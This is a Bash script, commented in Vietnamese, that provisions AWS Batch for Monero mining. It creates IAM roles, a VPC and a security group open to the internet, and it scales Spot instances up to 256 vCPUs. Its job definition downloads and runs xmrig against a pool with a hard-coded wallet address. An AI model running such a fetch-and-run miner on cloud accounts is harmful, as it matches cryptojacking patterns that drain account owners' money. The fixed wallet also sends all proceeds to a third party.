#!/bin/bash

# Script tạo AWS Batch hoàn chỉnh từ đầu cho mining Monero
# Yêu cầu: AWS CLI đã cài đặt và cấu hình với quyền đủ để tạo các tài nguyên

# Các biến cấu hình có thể thay đổi
REGION="us-east-1"
AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
ENVIRONMENT_NAME="MoneroMiningBatch"
SERVICE_ROLE_NAME="AWSBatchServiceRole-$ENVIRONMENT_NAME"
ECS_INSTANCE_ROLE_NAME="ecsInstanceRole-$ENVIRONMENT_NAME"
BATCH_INSTANCE_ROLE_NAME="AWSBatchInstanceRole-$ENVIRONMENT_NAME"
INSTANCE_TYPES="c7a.2xlarge"
MIN_VCPUS=0
MAX_VCPUS=256
DESIRED_VCPUS=4
SPOT_PERCENTAGE=100 # Sử dụng 100% Spot instances để tiết kiệm chi phí
VPC_CIDR="10.0.0.0/16"
PUBLIC_SUBNET_CIDR="10.0.1.0/24"

# Tạo IAM roles cho AWS Batch

# 1. Tạo AWS Batch Service Role
echo "Tạo AWS Batch Service Role..."
aws iam create-role --role-name $SERVICE_ROLE_NAME --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "batch.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}' > /dev/null 2>&1 || echo "Role $SERVICE_ROLE_NAME đã tồn tại, bỏ qua..."

# Gắn policy cho Service Role
aws iam attach-role-policy --role-name $SERVICE_ROLE_NAME --policy-arn arn:aws:iam::aws:policy/service-role/AWSBatchServiceRole

# 2. Tạo ECS Instance Role
echo "Tạo ECS Instance Role..."
aws iam create-role --role-name $ECS_INSTANCE_ROLE_NAME --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}' > /dev/null 2>&1 || echo "Role $ECS_INSTANCE_ROLE_NAME đã tồn tại, bỏ qua..."

# Gắn policy cho ECS Instance Role
aws iam attach-role-policy --role-name $ECS_INSTANCE_ROLE_NAME --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role

# 3. Tạo Instance Profile
echo "Tạo Instance Profile..."
aws iam create-instance-profile --instance-profile-name $ECS_INSTANCE_ROLE_NAME > /dev/null 2>&1 || echo "Instance Profile $ECS_INSTANCE_ROLE_NAME đã tồn tại, bỏ qua..."
aws iam add-role-to-instance-profile --instance-profile-name $ECS_INSTANCE_ROLE_NAME --role-name $ECS_INSTANCE_ROLE_NAME

# 4. Tạo AWS Batch Instance Role
echo "Tạo AWS Batch Instance Role..."
aws iam create-role --role-name $BATCH_INSTANCE_ROLE_NAME --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}' > /dev/null 2>&1 || echo "Role $BATCH_INSTANCE_ROLE_NAME đã tồn tại, bỏ qua..."

# Gắn policy cho Batch Instance Role
aws iam attach-role-policy --role-name $BATCH_INSTANCE_ROLE_NAME --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role

# Kiểm tra và tạo VPC, Subnet, Security Group
echo "Kiểm tra và tạo VPC, Subnet, Security Group..."

# Kiểm tra xem VPC đã tồn tại chưa
VPC_ID=$(aws ec2 describe-vpcs --filters "Name=tag:Name,Values=$ENVIRONMENT_NAME-VPC" --query "Vpcs[0].VpcId" --output text --region $REGION)

if [ "$VPC_ID" == "None" ]; then
  echo "Tạo VPC mới..."
  VPC_ID=$(aws ec2 create-vpc --cidr-block $VPC_CIDR --region $REGION --query "Vpc.VpcId" --output text)
  aws ec2 create-tags --resources $VPC_ID --tags Key=Name,Value="$ENVIRONMENT_NAME-VPC" --region $REGION
  
  # Tạo Internet Gateway
  IGW_ID=$(aws ec2 create-internet-gateway --region $REGION --query "InternetGateway.InternetGatewayId" --output text)
  aws ec2 attach-internet-gateway --vpc-id $VPC_ID --internet-gateway-id $IGW_ID --region $REGION
  
  # Tạo Route Table
  ROUTE_TABLE_ID=$(aws ec2 describe-route-tables --filters "Name=vpc-id,Values=$VPC_ID" --query "RouteTables[0].RouteTableId" --output text --region $REGION)
  aws ec2 create-route --route-table-id $ROUTE_TABLE_ID --destination-cidr-block 0.0.0.0/0 --gateway-id $IGW_ID --region $REGION
fi

# Kiểm tra và tạo Subnet
SUBNET_ID=$(aws ec2 describe-subnets --filters "Name=vpc-id,Values=$VPC_ID" "Name=cidr-block,Values=$PUBLIC_SUBNET_CIDR" --query "Subnets[0].SubnetId" --output text --region $REGION)

if [ "$SUBNET_ID" == "None" ]; then
  echo "Tạo Subnet mới..."
  SUBNET_ID=$(aws ec2 create-subnet --vpc-id $VPC_ID --cidr-block $PUBLIC_SUBNET_CIDR --availability-zone "${REGION}a" --region $REGION --query "Subnet.SubnetId" --output text)
  aws ec2 modify-subnet-attribute --subnet-id $SUBNET_ID --map-public-ip-on-launch --region $REGION
fi

SUBNET_IDS=$SUBNET_ID

# Kiểm tra và tạo Security Group
SG_ID=$(aws ec2 describe-security-groups --filters "Name=vpc-id,Values=$VPC_ID" "Name=group-name,Values=$ENVIRONMENT_NAME-SG" --query "SecurityGroups[0].GroupId" --output text --region $REGION)

if [ "$SG_ID" == "None" ]; then
  echo "Tạo Security Group mới..."
  SG_ID=$(aws ec2 create-security-group --group-name "$ENVIRONMENT_NAME-SG" --description "Security group for Monero mining" --vpc-id $VPC_ID --region $REGION --query "GroupId" --output text)
  
  # Thêm rule cho Security Group
  aws ec2 authorize-security-group-ingress --group-id $SG_ID --protocol tcp --port 22 --cidr 0.0.0.0/0 --region $REGION
  aws ec2 authorize-security-group-ingress --group-id $SG_ID --protocol tcp --port 80 --cidr 0.0.0.0/0 --region $REGION
  aws ec2 authorize-security-group-ingress --group-id $SG_ID --protocol tcp --port 443 --cidr 0.0.0.0/0 --region $REGION
  # Mở port cho mining (nếu cần)
  aws ec2 authorize-security-group-ingress --group-id $SG_ID --protocol tcp --port 7029 --cidr 0.0.0.0/0 --region $REGION
  aws ec2 authorize-security-group-egress --group-id $SG_ID --protocol all --cidr 0.0.0.0/0 --region $REGION
fi

SECURITY_GROUP_IDS=$SG_ID

# Tạo Compute Environment
echo "Tạo Compute Environment..."
COMPUTE_ENV_ARN=$(aws batch create-compute-environment \
  --compute-environment-name $ENVIRONMENT_NAME-ComputeEnv \
  --type MANAGED \
  --state ENABLED \
  --service-role arn:aws:iam::$AWS_ACCOUNT_ID:role/$SERVICE_ROLE_NAME \
  --compute-resources "type=EC2,minvCpus=$MIN_VCPUS,maxvCpus=$MAX_VCPUS,desiredvCpus=$DESIRED_VCPUS,instanceTypes=$INSTANCE_TYPES,subnets=$SUBNET_IDS,securityGroupIds=$SECURITY_GROUP_IDS,instanceRole=arn:aws:iam::$AWS_ACCOUNT_ID:instance-profile/$ECS_INSTANCE_ROLE_NAME,spotIamFleetRole=arn:aws:iam::$AWS_ACCOUNT_ID:role/$BATCH_INSTANCE_ROLE_NAME,bidPercentage=$SPOT_PERCENTAGE" \
  --region $REGION \
  --query "computeEnvironmentArn" \
  --output text)

echo "Compute Environment ARN: $COMPUTE_ENV_ARN"

# Đợi Compute Environment active
echo "Đợi Compute Environment chuyển sang trạng thái ACTIVE..."
while true; do
  STATUS=$(aws batch describe-compute-environments \
    --compute-environments $ENVIRONMENT_NAME-ComputeEnv \
    --region $REGION \
    --query "computeEnvironments[0].status" \
    --output text)
  
  if [ "$STATUS" = "VALID" ] || [ "$STATUS" = "ACTIVE" ]; then
    break
  elif [ "$STATUS" = "INVALID" ]; then
    echo "Lỗi tạo Compute Environment. Kiểm tra lại cấu hình."
    exit 1
  fi
  echo "Trạng thái hiện tại: $STATUS - Đợi thêm 10 giây..."
  sleep 10
done

# Tạo Job Queue
echo "Tạo Job Queue..."
JOB_QUEUE_ARN=$(aws batch create-job-queue \
  --job-queue-name $ENVIRONMENT_NAME-Queue \
  --state ENABLED \
  --priority 1 \
  --compute-environment-order order=1,computeEnvironment=$COMPUTE_ENV_ARN \
  --region $REGION \
  --query "jobQueueArn" \
  --output text)

echo "Job Queue ARN: $JOB_QUEUE_ARN"

# Đợi Job Queue active
echo "Đợi Job Queue chuyển sang trạng thái ACTIVE..."
while true; do
  STATUS=$(aws batch describe-job-queues \
    --job-queues $ENVIRONMENT_NAME-Queue \
    --region $REGION \
    --query "jobQueues[0].status" \
    --output text)
  
  if [ "$STATUS" = "VALID" ] || [ "$STATUS" = "ACTIVE" ]; then
    break
  elif [ "$STATUS" = "INVALID" ]; then
    echo "Lỗi tạo Job Queue. Kiểm tra lại cấu hình."
    exit 1
  fi
  echo "Trạng thái hiện tại: $STATUS - Đợi thêm 10 giây..."
  sleep 10
done

# Tạo Job Definition cho mining Monero
echo "Tạo Job Definition cho mining Monero..."
JOB_DEFINITION_ARN=$(aws batch register-job-definition \
  --job-definition-name $ENVIRONMENT_NAME-MoneroMiner \
  --type container \
  --container-properties '{
    "image": "ubuntu:latest",
    "vcpus": 8,
    "memory": 16384,
    "command": ["sh", "-c", "apt-get update && apt-get install -y wget && wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM8-25-3 -k --coin monero -a rx/8"],
    "resourceRequirements": [
      {"type": "VCPU", "value": "8"},
      {"type": "MEMORY", "value": "16384"}
    ]
  }' \
  --region $REGION \
  --query "jobDefinitionArn" \
  --output text)

echo "Job Definition ARN: $JOB_DEFINITION_ARN"

# Gửi một job mining thử nghiệm
echo "Gửi job mining thử nghiệm..."
JOB_ID=$(aws batch submit-job \
  --job-name monero-mining-job \
  --job-queue $ENVIRONMENT_NAME-Queue \
  --job-definition $ENVIRONMENT_NAME-MoneroMiner \
  --region $REGION \
  --query "jobId" \
  --output text)

echo "Job ID: $JOB_ID"

# Kiểm tra trạng thái job
echo "Kiểm tra trạng thái job..."
aws batch describe-jobs --jobs $JOB_ID --region $REGION

echo "Hoàn thành thiết lập AWS Batch cho Monero Mining!"
echo "Compute Environment: $COMPUTE_ENV_ARN"
echo "Job Queue: $JOB_QUEUE_ARN"
echo "Job Definition: $JOB_DEFINITION_ARN"
echo "VPC ID: $VPC_ID"
echo "Subnet ID: $SUBNET_IDS"
echo "Security Group ID: $SECURITY_GROUP_IDS"
